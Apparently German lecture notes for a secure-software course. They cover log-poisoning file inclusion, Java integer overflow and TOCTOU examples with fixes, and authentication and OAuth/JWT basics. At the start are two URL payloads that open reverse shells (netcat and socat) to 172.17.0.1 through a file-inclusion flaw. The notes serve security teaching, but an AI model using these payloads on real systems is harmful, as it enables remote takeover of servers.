      <text:p text:style-name="P604">localhost/vulnerabilities/fi/?cmd=nc%20-e%20/bin/sh%20172.17.0.1%204242&amp;page=../../../../../../../../var/log/apache2/access.log</text:p>
      <text:p text:style-name="First_20_paragraph">Socat:</text:p>
      <text:p text:style-name="P605">localhost/vulnerabilities/fi/?cmd=socat%20TCP4:172.17.0.1:4444%20EXEC:/bin/bash&amp;page=../../../../../../../../var/log/apache2/access.log</text:p>
      <text:list text:style-name="L229">
        <text:list-item>
          <text:p text:style-name="P606"><text:span text:style-name="T1">Gegenmaßnahmen</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P606"><text:span text:style-name="T1">Eingabevalidierung</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P606">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07">List&lt;String&gt; data = new ArrayList&lt;String&gt;(MAX);</text:p>
      <text:p text:style-name="First_20_paragraph">Dabei ist <text:span text:style-name="T1">MAX</text:span> folgendermaßen definiert:</text:p>
      <text:p text:style-name="P608">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0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10">current = 50</text:p>
      <text:p text:style-name="P611">extra = Integer.MAX_VALUE:</text:p>
      <text:p text:style-name="First_20_paragraph">Nehmen wir an, wir verwenden foldende Implementierung von <text:span text:style-name="Source_Text">setElementToExtraPosition()</text:span>:</text:p>
      <text:p text:style-name="P612">if (extra &lt; 0 || current + extra &gt; MAX) {</text:p>
      <text:p text:style-name="P613"><text:s text:c="4"/>throw new IllegalArgumentException();</text:p>
      <text:p text:style-name="P614">}</text:p>
      <text:p text:style-name="P61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1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17">import java.math.BigInteger;</text:p>
      <text:p text:style-name="P618">import java.util.ArrayList;</text:p>
      <text:p text:style-name="P619">import java.util.List;</text:p>
      <text:p text:style-name="P620"/>
      <text:p text:style-name="P621">public class IntegerOverflow {</text:p>
      <text:p text:style-name="P622"/>
      <text:p text:style-name="P623"><text:s text:c="4"/>private static final int MAX = 100; // Integer.MAX_VALUE + 1</text:p>
      <text:p text:style-name="P624"/>
      <text:p text:style-name="P625"><text:s text:c="4"/>private int current;</text:p>
      <text:p text:style-name="P626"><text:s text:c="4"/>private List&lt;String&gt; data;</text:p>
      <text:p text:style-name="P627"/>
      <text:p text:style-name="P628"><text:s text:c="4"/>public IntegerOverflow() {</text:p>
      <text:p text:style-name="P629"><text:s text:c="8"/>current = 0;</text:p>
      <text:p text:style-name="P630"><text:s text:c="8"/>data = new ArrayList&lt;String&gt;(MAX);</text:p>
      <text:p text:style-name="P631"><text:s text:c="8"/>for (int i = 0; i &lt; MAX; i++) {</text:p>
      <text:p text:style-name="P632"><text:s text:c="12"/>data.add(i, <text:s text:c="1"/>"");</text:p>
      <text:p text:style-name="P633"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P634"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P635"/>
      <text:p text:style-name="P636"><text:s text:c="4"/>public static void main(String[] args) {</text:p>
      <text:p text:style-name="P637"><text:s text:c="8"/>IntegerOverflow io = new IntegerOverflow();</text:p>
      <text:p text:style-name="P638"><text:s text:c="8"/>io.process();</text:p>
      <text:p text:style-name="P639"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P640"/>
      <text:p text:style-name="P641"><text:s text:c="4"/>private void process() {</text:p>
      <text:p text:style-name="P642"><text:s text:c="8"/>System.out.println("Liste im Initialzustand:");</text:p>
      <text:p text:style-name="P643"><text:s text:c="8"/>System.out.println(data.toString());</text:p>
      <text:p text:style-name="P644"/>
      <text:p text:style-name="P645"><text:s text:c="8"/>current = 50; // Integer.MAX_VALUE</text:p>
      <text:p text:style-name="P646"/>
      <text:p text:style-name="P647"><text:s text:c="8"/>data.set(current, "Alter Wert");</text:p>
      <text:p text:style-name="P648"><text:s text:c="8"/>System.out.println("\nListe nach Setzen eines Wertes auf Position current = " + current);</text:p>
      <text:p text:style-name="P649"><text:s text:c="8"/>System.out.println(data.toString());</text:p>
      <text:p text:style-name="P650"/>
      <text:p text:style-name="P651"><text:s text:c="8"/>int extra = Integer.MAX_VALUE + Math.abs(Integer.MIN_VALUE) + 1;</text:p>
      <text:p text:style-name="P652">// <text:s text:c="5"/>int extra = Math.abs(Integer.MIN_VALUE) + 1;</text:p>
      <text:p text:style-name="P653">// <text:s text:c="5"/>int extra = Integer.MAX_VALUE;</text:p>
      <text:p text:style-name="P654">// <text:s text:c="5"/>System.out.println("\nBerechnung des extra-Index durch Integer.MAX_VALUE + Math.abs(Integer.MIN_VALUE) + 1 = " + extra);</text:p>
      <text:p text:style-name="P655"><text:s text:c="8"/>System.out.println("\nextra-Index: = " + extra);</text:p>
      <text:p text:style-name="P656"/>
      <text:p text:style-name="P657"><text:s text:c="8"/>setElementToExtraPosition(extra, "Neuer falscher Wert");</text:p>
      <text:p text:style-name="P658"><text:s text:c="8"/>System.out.println("\nListe nach Setzen eines Wertes auf Position current (" + current + ") + extra (" + extra + ") = " + (current + extra));</text:p>
      <text:p text:style-name="P659"><text:s text:c="8"/>System.out.println(data.toString());</text:p>
      <text:p text:style-name="P660"/>
      <text:p text:style-name="P661">// <text:s text:c="5"/>setElementToExtraPositionMoreSecure(extra, "Neuer Wert More Secure");</text:p>
      <text:p text:style-name="P662">// <text:s text:c="5"/>System.out.println("\nListe nach Setzen eines Wertes auf Position current (" + current + ") + extra (" + extra + ") = " + (current + extra));</text:p>
      <text:p text:style-name="P663">// <text:s text:c="5"/>System.out.println(data.toString());</text:p>
      <text:p text:style-name="P664">//</text:p>
      <text:p text:style-name="P665">// <text:s text:c="5"/>setElementToExtraPositionSecure(extra, "Neuer Wert Secure");</text:p>
      <text:p text:style-name="P666">// <text:s text:c="5"/>System.out.println("\nListe nach Setzen eines Wertes auf Position current (" + current + ") + extra (" + extra + ") = " + (current + extra));</text:p>
      <text:p text:style-name="P667">// <text:s text:c="5"/>System.out.println(data.toString());</text:p>
      <text:p text:style-name="P668"/>
      <text:p text:style-name="P669"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P670"/>
      <text:p text:style-name="P671"><text:s text:c="4"/>private void setElementToExtraPosition(int extra, String element) {</text:p>
      <text:p text:style-name="P672">// <text:s text:c="5"/>System.out.println("current + extra = " + (current + extra));</text:p>
      <text:p text:style-name="P673"><text:s text:c="8"/>if (extra &lt; 0 || current + extra &gt; MAX) {</text:p>
      <text:p text:style-name="P674"><text:s text:c="12"/>throw new IllegalArgumentException();</text:p>
      <text:p text:style-name="P675"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P676"><text:s text:c="8"/>data.set(current + extra, element);</text:p>
      <text:p text:style-name="P677"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P678"/>
      <text:p text:style-name="P679"><text:s text:c="4"/>private void setElementToExtraPositionMoreSecure(int extra, String element) {</text:p>
      <text:p text:style-name="P680"><text:s text:c="8"/>if (extra &lt; 0 || current &gt; MAX - extra) {</text:p>
      <text:p text:style-name="P681"><text:s text:c="12"/>throw new IllegalArgumentException();</text:p>
      <text:p text:style-name="P682"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P683"><text:s text:c="8"/>data.set(current + extra, element);</text:p>
      <text:p text:style-name="P684"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P685"/>
      <text:p text:style-name="P686"><text:s text:c="4"/>private void setElementToExtraPositionSecure(int extra, String element) {</text:p>
      <text:p text:style-name="P687"><text:s text:c="8"/>BigInteger currentBig = BigInteger.valueOf(current);</text:p>
      <text:p text:style-name="P688"><text:s text:c="8"/>BigInteger maxBig = BigInteger.valueOf(MAX);</text:p>
      <text:p text:style-name="P689"><text:s text:c="8"/>BigInteger extraBig = BigInteger.valueOf(extra);</text:p>
      <text:p text:style-name="P690"><text:s text:c="8"/>if (extra &lt; 0 || currentBig.add(extraBig).compareTo(maxBig) &gt; 0) {</text:p>
      <text:p text:style-name="P691"><text:s text:c="12"/>throw new IllegalArgumentException();</text:p>
      <text:p text:style-name="P692"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P693"><text:s text:c="8"/>data.set(current + extra, element);</text:p>
      <text:p text:style-name="P694"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P695">}</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696">package toctou_solution;</text:p>
      <text:p text:style-name="P697"/>
      <text:p text:style-name="P698">public class Person {</text:p>
      <text:p text:style-name="P699"/>
      <text:p text:style-name="P700"><text:s text:c="4"/>private String username;</text:p>
      <text:p text:style-name="P701"><text:s text:c="4"/>private String passwort;</text:p>
      <text:p text:style-name="P702"><text:s text:c="4"/>private Double gewicht;</text:p>
      <text:p text:style-name="P703"/>
      <text:p text:style-name="P704"><text:s text:c="4"/>public Person(String username, String passwort, Double gewicht) {</text:p>
      <text:p text:style-name="P705"><text:s text:c="8"/>super();</text:p>
      <text:p text:style-name="P706"><text:s text:c="8"/>this.username = username;</text:p>
      <text:p text:style-name="P707"><text:s text:c="8"/>this.passwort = passwort;</text:p>
      <text:p text:style-name="P708"><text:s text:c="8"/>this.gewicht = gewicht;</text:p>
      <text:p text:style-name="P709"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P710"/>
      <text:p text:style-name="P711"><text:s text:c="4"/>public String getUsername() {</text:p>
      <text:p text:style-name="P712"><text:s text:c="8"/>return username;</text:p>
      <text:p text:style-name="P713"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P714"/>
      <text:p text:style-name="P715"><text:s text:c="4"/>public void setUsername(String username) {</text:p>
      <text:p text:style-name="P716"><text:s text:c="8"/>this.username = username;</text:p>
      <text:p text:style-name="P717"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P718"/>
      <text:p text:style-name="P719"><text:s text:c="4"/>public String getPasswort() {</text:p>
      <text:p text:style-name="P720"><text:s text:c="8"/>return passwort;</text:p>
      <text:p text:style-name="P721"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P722"/>
      <text:p text:style-name="P723"><text:s text:c="4"/>public void setPasswort(String passwort) {</text:p>
      <text:p text:style-name="P724"><text:s text:c="8"/>this.passwort = passwort;</text:p>
      <text:p text:style-name="P725"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P726"/>
      <text:p text:style-name="P727"><text:s text:c="4"/>public Double getGewicht() {</text:p>
      <text:p text:style-name="P728"><text:s text:c="8"/>return gewicht;</text:p>
      <text:p text:style-name="P729"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P730"/>
      <text:p text:style-name="P731"><text:s text:c="4"/>public void setGewicht(Double gewicht) {</text:p>
      <text:p text:style-name="P732"><text:s text:c="8"/>this.gewicht = gewicht;</text:p>
      <text:p text:style-name="P733"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P734"/>
      <text:p text:style-name="P735"><text:s text:c="4"/>@Override</text:p>
      <text:p text:style-name="P736"><text:s text:c="4"/>public String toString() {</text:p>
      <text:p text:style-name="P737"><text:s text:c="8"/>return "Person [username=" + username + ", passwort=" + passwort + ", gewicht=" + gewicht + "]";</text:p>
      <text:p text:style-name="P738"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P739">}</text:p>
      <text:p text:style-name="First_20_paragraph"><text:span text:style-name="Source_Text">TOCTOU.java</text:span></text:p>
      <text:p text:style-name="P740">package toctou_solution;</text:p>
      <text:p text:style-name="P741"/>
      <text:p text:style-name="P742">import java.util.logging.Logger;</text:p>
      <text:p text:style-name="P743"/>
      <text:p text:style-name="P744">import toctou.exception.PersonException;</text:p>
      <text:p text:style-name="P745"/>
      <text:p text:style-name="P746">public class TOCTOU {</text:p>
      <text:p text:style-name="P747"/>
      <text:p text:style-name="P748"><text:s text:c="4"/>private static Logger logger = Logger.getLogger(TOCTOU.class.getName());</text:p>
      <text:p text:style-name="P749"/>
      <text:p text:style-name="P750"><text:s text:c="4"/>class AttackThread extends Thread {</text:p>
      <text:p text:style-name="P751"/>
      <text:p text:style-name="P752"><text:s text:c="8"/>private Person person;</text:p>
      <text:p text:style-name="P753"/>
      <text:p text:style-name="P754"><text:s text:c="8"/>public AttackThread(Person p) {</text:p>
      <text:p text:style-name="P755"><text:s text:c="12"/>this.person = p;</text:p>
      <text:p text:style-name="P756"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P757"/>
      <text:p text:style-name="P758"><text:s text:c="8"/>@Override</text:p>
      <text:p text:style-name="P759"><text:s text:c="8"/>public void run() {</text:p>
      <text:p text:style-name="P760"><text:s text:c="12"/>try {</text:p>
      <text:p text:style-name="P761"><text:s text:c="16"/>Thread.sleep(500);</text:p>
      <text:p text:style-name="P762"><text:s text:c="12"/>} catch (InterruptedException e) {</text:p>
      <text:p text:style-name="P763"><text:s text:c="16"/>// TODO Auto-generated catch block</text:p>
      <text:p text:style-name="P764"><text:s text:c="16"/>e.printStackTrace();</text:p>
      <text:p text:style-name="P765"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="P766"><text:s text:c="12"/>person.setPasswort("pwnd");</text:p>
      <text:p text:style-name="P767"><text:s text:c="12"/>person.setGewicht(1000.0d);</text:p>
      <text:p text:style-name="P768"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P769"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P770"/>
      <text:p text:style-name="P771"><text:s text:c="4"/>private boolean validatePerson(Person p) {</text:p>
      <text:p text:style-name="P772"><text:s text:c="8"/>// TODO: Rufen Sie die entsprechenden Methoden der Klasse Validator auf.</text:p>
      <text:p text:style-name="P773"><text:s text:c="8"/>logger.info("Validiere Person : " + p);</text:p>
      <text:p text:style-name="P774"><text:s text:c="8"/>Validator v = Validator.getInstance();</text:p>
      <text:p text:style-name="P775"><text:s text:c="8"/>if (!v.checkValidString(p.getUsername())) {</text:p>
      <text:p text:style-name="P776"><text:s text:c="12"/>return false;</text:p>
      <text:p text:style-name="P777"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P778"><text:s text:c="8"/>if (!v.checkValidPassword(p.getPasswort())) {</text:p>
      <text:p text:style-name="P779"><text:s text:c="12"/>return false;</text:p>
      <text:p text:style-name="P780"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P781"><text:s text:c="8"/>if (!v.checkValidDouble(p.getGewicht())) {</text:p>
      <text:p text:style-name="P782"><text:s text:c="12"/>return false;</text:p>
      <text:p text:style-name="P783"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P784"><text:s text:c="8"/>return true;</text:p>
      <text:p text:style-name="P785"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P786"/>
      <text:p text:style-name="P787"><text:s text:c="4"/>public void speicherePerson(Person p) throws PersonException {</text:p>
      <text:p text:style-name="P788"><text:s text:c="8"/>// TODO: Validieren Sie das Argument p durch Aufruf der Methode validatePerson()</text:p>
      <text:p text:style-name="P789"><text:s text:c="8"/>// Remove the following line of code to demonstrate a successful attack.</text:p>
      <text:p text:style-name="P790"><text:s text:c="8"/>Person person = new Person(p.getUsername(), p.getPasswort(), p.getGewicht());</text:p>
      <text:p text:style-name="P791"><text:s text:c="8"/>if (!validatePerson(person)) {</text:p>
      <text:p text:style-name="P792"><text:s text:c="12"/>throw new PersonException("Person enthält ungültige Werte: " + person);</text:p>
      <text:p text:style-name="P793"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P794"><text:s text:c="8"/>try {</text:p>
      <text:p text:style-name="P795"><text:s text:c="12"/>Thread.sleep(3000);</text:p>
      <text:p text:style-name="P796"><text:s text:c="8"/>} catch (InterruptedException e) {</text:p>
      <text:p text:style-name="P797"><text:s text:c="12"/>// TODO Auto-generated catch block</text:p>
      <text:p text:style-name="P798"><text:s text:c="12"/>e.printStackTrace();</text:p>
      <text:p text:style-name="P799"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P800"><text:s text:c="8"/>logger.info("Person " + person + " erfolgreich gespeichert.");</text:p>
      <text:p text:style-name="P801"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P802"/>
      <text:p text:style-name="P803"><text:s text:c="4"/>public static void main(String[] args) {</text:p>
      <text:p text:style-name="P804"><text:s text:c="8"/>TOCTOU t = new TOCTOU();</text:p>
      <text:p text:style-name="P805"><text:s text:c="8"/>Person person = new Person("sheldon", "abc123xyz!", 73.0);</text:p>
      <text:p text:style-name="P806"><text:s text:c="8"/>AttackThread at = t.new AttackThread(person);</text:p>
      <text:p text:style-name="P807"><text:s text:c="8"/>at.start();</text:p>
      <text:p text:style-name="P808"><text:s text:c="8"/>try {</text:p>
      <text:p text:style-name="P809"><text:s text:c="12"/>t.speicherePerson(person);</text:p>
      <text:p text:style-name="P810"><text:s text:c="8"/>} catch (PersonException e) {</text:p>
      <text:p text:style-name="P811"><text:s text:c="12"/>// person.setUsername("xxxxxxxxxxxxx");</text:p>
      <text:p text:style-name="P812"><text:s text:c="12"/>// person.setUsername(null);</text:p>
      <text:p text:style-name="P813"><text:s text:c="12"/>// person.setPasswort("xxxxxxxxxxxxx");</text:p>
      <text:p text:style-name="P814"><text:s text:c="12"/>// person.setPasswort(null);</text:p>
      <text:p text:style-name="P815"><text:s text:c="12"/>// person.setGewicht(0.0);</text:p>
      <text:p text:style-name="P816"><text:s text:c="12"/>// person = null;</text:p>
      <text:p text:style-name="P817"><text:s text:c="12"/>logger.warning(e.getMessage());</text:p>
      <text:p text:style-name="P818"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P819"/>
      <text:p text:style-name="P820"><text:s text:c="8"/>try {</text:p>
      <text:p text:style-name="P821"><text:s text:c="12"/>at.join();</text:p>
      <text:p text:style-name="P822"><text:s text:c="8"/>} catch (InterruptedException e) {</text:p>
      <text:p text:style-name="P823"><text:s text:c="12"/>// TODO Auto-generated catch block</text:p>
      <text:p text:style-name="P824"><text:s text:c="12"/>e.printStackTrace();</text:p>
      <text:p text:style-name="P825"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P826"><text:s text:c="8"/>System.out.println("Inhalt von Person am Ende des Programms: " + person);</text:p>
      <text:p text:style-name="P827"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P828">}</text:p>
      <text:p text:style-name="First_20_paragraph"><text:span text:style-name="Source_Text">Validator.java</text:span></text:p>
      <text:p text:style-name="P829">package toctou_solution;</text:p>
      <text:p text:style-name="P830"/>
      <text:p text:style-name="P831">public class Validator {</text:p>
      <text:p text:style-name="P832"><text:s text:c="4"/>private static Validator validator = new Validator();</text:p>
      <text:p text:style-name="P833"/>
      <text:p text:style-name="P834"><text:s text:c="4"/>public static Validator getInstance() {</text:p>
      <text:p text:style-name="P835"><text:s text:c="8"/>return validator;</text:p>
      <text:p text:style-name="P836"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P837"/>
      <text:p text:style-name="P838"><text:s text:c="4"/>public boolean checkValidString(String s) {</text:p>
      <text:p text:style-name="P839"><text:s text:c="8"/>// TODO: Implementieren Sie die Prüfung von Zeichenketten so, dass</text:p>
      <text:p text:style-name="P840"><text:s text:c="8"/>// <text:s text:c="6"/>1. null-Strings und leere Zeichenketten NICHT erlaubt sind</text:p>
      <text:p text:style-name="P841"><text:s text:c="8"/>// <text:s text:c="6"/>2. nur Klein- und Großbuchstaben erlaubt sind.</text:p>
      <text:p text:style-name="P842"><text:s text:c="8"/>// <text:s text:c="6"/>Zeichenketten dürfen eine beliebige Länge haben.</text:p>
      <text:p text:style-name="P843"><text:s text:c="8"/>if (s == null) {</text:p>
      <text:p text:style-name="P844"><text:s text:c="12"/>return false;</text:p>
      <text:p text:style-name="P845"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P846"><text:s text:c="8"/>String pattern = "[a-zA-Z]+";</text:p>
      <text:p text:style-name="P847"><text:s text:c="8"/>return s.matches(pattern);</text:p>
      <text:p text:style-name="P848"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P849"/>
      <text:p text:style-name="P850"><text:s text:c="4"/>public boolean checkValidPassword(String s) {</text:p>
      <text:p text:style-name="P851"><text:s text:c="8"/>// TODO: Implementieren Sie die Prüfung von Passwörtern so, dass</text:p>
      <text:p text:style-name="P852"><text:s text:c="8"/>// <text:s text:c="6"/>1. null-Strings und leere Zeichenketten NICHT erlaubt sind</text:p>
      <text:p text:style-name="P853"><text:s text:c="8"/>// <text:s text:c="6"/>2. ein Passwort mindestens 10 Zeichen haben muss.</text:p>
      <text:p text:style-name="P854"><text:s text:c="8"/>if (s == null || s.trim().isEmpty()) {</text:p>
      <text:p text:style-name="P855"><text:s text:c="12"/>return false;</text:p>
      <text:p text:style-name="P856"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P857"><text:s text:c="8"/>if (s.length() &lt; 10) {</text:p>
      <text:p text:style-name="P858"><text:s text:c="12"/>return false;</text:p>
      <text:p text:style-name="P859"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P860"><text:s text:c="8"/>return true;</text:p>
      <text:p text:style-name="P861"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P862"/>
      <text:p text:style-name="P863"><text:s text:c="4"/>public boolean checkValidDouble(Double d) {</text:p>
      <text:p text:style-name="P864"><text:s text:c="8"/>// TODO: Implementieren Sie die Prüfung von Gewichtsangaben so, dass das Gewicht zwischen 0.0 und 300.0 Kg liegen muss.</text:p>
      <text:p text:style-name="P865"><text:s text:c="8"/>if (d == null) {</text:p>
      <text:p text:style-name="P866"><text:s text:c="12"/>return false;</text:p>
      <text:p text:style-name="P867"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P868"><text:s text:c="8"/>if (d &lt; 0.0d || d &gt; 300.0d) {</text:p>
      <text:p text:style-name="P869"><text:s text:c="12"/>return false;</text:p>
      <text:p text:style-name="P870"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P871"><text:s text:c="8"/>return true;</text:p>
      <text:p text:style-name="P872"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P873">}</text:p>
      <text:p text:style-name="First_20_paragraph">TOOD: Add Interpretation</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874"><text:span text:style-name="T1">Nachweis einer Eigenschaft</text:span> / Bezeugung der Echtheit</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P874">i.d.R.</text:p>
          <text:list text:style-name="L231">
            <text:list-item>
              <text:p text:style-name="P875"><text:span text:style-name="T1">Sicherstellung der Identität</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P875">Nachweis einer Person, dass sie tatsächlich diejenige Person ist, die sie vorgibt zu sein</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P875">Person legt also Nachweise vor, die ihre Identität bestätigen sollen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P875">Beantwortung der Frage “Wer bin ich?”</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="First_20_paragraph"><text:span text:style-name="T1">Authentifizierung</text:span></text:p>
      <text:list text:style-name="L232">
        <text:list-item>
          <text:p text:style-name="P876"><text:span text:style-name="T1">Prüfung der behaupteten Authentisierung</text:span> / Vorgang der Echtheitsprüfung</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P876">Verifizieren der behaupteten Eigenschaft durch Überprüfen der vorgelegten Nachweise</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P876">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877"><text:span text:style-name="T1">Einräumen von speziellen Rechten</text:span> für authentifizierte Personen / Systeme</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P877">Zuweisung von Rechten in Abhängigkeit der jeweiligen Identität</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P877">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878"><text:span text:style-name="T1">Wissen</text:span>: Passwort, PIN</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P878"><text:span text:style-name="T1">Besitz</text:span>: Token, Zertifikat</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P878"><text:span text:style-name="T1">Eigenschaften</text:span>: Biometrische Daten</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="First_20_paragraph"><text:span text:style-name="T1">Starke Authentisierung</text:span></text:p>
      <text:list text:style-name="L235">
        <text:list-item>
          <text:p text:style-name="P879">keine statischen Passwörter</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P879">keine schwachen Passwörter</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P879">Mehrfaktor Authentifizierung</text:p>
          <text:list text:style-name="L236">
            <text:list-item>
              <text:p text:style-name="P880">Kombinationen von Wissen, Besitz und Eigenschaften</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P879">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881">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882">Eintauschen eines Autorisierungs-Codes (authorization code) gegen eine Zugriffsberechtigung (access token)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P882">Authorization Code -&gt; Access Token</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P882"><text:span text:style-name="T1">Vorgehen</text:span></text:p>
          <text:list text:style-name="L239">
            <text:list-item>
              <text:p text:style-name="P883">Client bekommt Autorisierungs-Code (authorization code) vom Authorization Server, nachdem der Endnutzer (resource owner) dies erlaubt hat, z.B. durch ein Login mit Benutzername und Passwort auf dem Authorization Server</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P883">Zuvor muss Client beim Authorization Server registriert sein, damit Authorization Codes nur an vertrauenswürdige Clients herausgegeben werden, also nicht an Clients, die ein Angreifer kontrolliert</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P883">Client tauscht Autorisierungs-Code dann beim Authorization Server gegen ein Access Token ein</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P883">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884">Refresh Token kann eine zufällige Zeichenkette sein</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P884"><text:span text:style-name="T1">Problem</text:span></text:p>
          <text:list text:style-name="L241">
            <text:list-item>
              <text:p text:style-name="P885">Authorization Server muss dann speichern, welches Refresh Token er (für welchen Client) ausgestellt hat, um diesen in Schritt 7 des Diagramms der vorangegangenen Folie überprüfen zu können</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P885">Typischerweise werden solche Refresh Tokens serverseitig in einer Datenbank gespeichert</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P885">Server verwaltet somit einen Zustand in Form von Refresh Tokens</text:p>
              <text:list text:style-name="L242">
                <text:list-item>
                  <text:p text:style-name="P886">Server ist stateful</text:p>
                </text:list-item>
              </text:list>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P885">Abhilfe durch JSON Web Tokens (JWT) als Refresh Token</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P885">Zustand ist dann in JWT enthalten</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P885">JWT Refresh Token muss nicht auf Server gespeichert werden</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P885">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15:19:16Z</meta:creation-date>
    <dc:date>2022-02-07T15:19:16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